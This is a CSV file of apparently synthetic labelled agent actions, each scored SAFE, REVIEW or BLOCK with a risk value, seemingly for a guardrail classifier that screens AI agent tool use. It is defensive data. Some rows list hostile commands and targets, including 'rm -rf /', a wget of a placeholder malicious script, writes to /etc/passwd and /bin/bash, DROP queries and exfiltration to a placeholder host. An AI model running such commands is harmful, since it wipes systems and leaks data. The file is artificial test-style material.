action,agent_role,parameter,value,context,label,risk_score
stripe_charge,finance,amount,100,known_vendor,SAFE,0.1
stripe_charge,finance,amount,500,known_vendor,SAFE,0.2
stripe_charge,finance,amount,2500,known_vendor,SAFE,0.3
stripe_charge,finance,amount,8000,new_vendor,REVIEW,0.6
stripe_charge,finance,amount,15000,new_vendor,BLOCK,0.9
stripe_charge,finance,amount,50000,unknown_account,BLOCK,1.0

api_call,analytics,url,https://api.trusted.com,internal_query,SAFE,0.1
api_call,analytics,url,https://partner.service.com,data_fetch,SAFE,0.2
api_call,analytics,url,http://external.xyz,data_export,REVIEW,0.6
api_call,analytics,url,http://malicious.ru,data_exfiltration,BLOCK,0.95
api_call,analytics,url,ftp://unknown.server,data_transfer,BLOCK,0.9

file_write,ops,path,/reports/output.xlsx,report_generation,SAFE,0.1
file_write,ops,path,/tmp/log.txt,logging,SAFE,0.2
file_write,ops,path,/var/data/export.csv,data_export,REVIEW,0.5
file_write,ops,path,/etc/passwd,restricted_access,BLOCK,1.0
file_write,ops,path,/bin/bash,system_modification,BLOCK,1.0

db_query,analytics,query_type,SELECT,data_read,SAFE,0.1
db_query,analytics,query_type,INSERT,data_write,SAFE,0.3
db_query,analytics,query_type,UPDATE,data_update,REVIEW,0.5
db_query,analytics,query_type,DELETE,bulk_delete,REVIEW,0.7
db_query,analytics,query_type,DROP,database_destroy,BLOCK,1.0

email_send,marketing,recipient,known_client,newsletter,SAFE,0.1
email_send,marketing,recipient,subscribed_user,campaign,SAFE,0.2
email_send,marketing,recipient,bulk_list,mass_campaign,REVIEW,0.5
email_send,marketing,recipient,unknown_external,data_leak,BLOCK,0.9

shell_exec,devops,command,ls,diagnostics,SAFE,0.2
shell_exec,devops,command,df -h,monitoring,SAFE,0.3
shell_exec,devops,command,chmod 777,file_permission_change,REVIEW,0.6
shell_exec,devops,command,rm -rf /,system_wipe,BLOCK,1.0
shell_exec,devops,command,wget http://malicious.sh,remote_execution,BLOCK,0.95

data_export,analytics,volume_mb,10,reporting,SAFE,0.2
data_export,analytics,volume_mb,100,bulk_export,REVIEW,0.5
data_export,analytics,volume_mb,500,large_export,REVIEW,0.7
data_export,analytics,volume_mb,2000,exfiltration,BLOCK,1.0

auth_access,system,access_level,user,normal_access,SAFE,0.1
auth_access,system,access_level,admin,elevated_access,REVIEW,0.6
auth_access,system,access_level,root,privilege_escalation,BLOCK,1.0
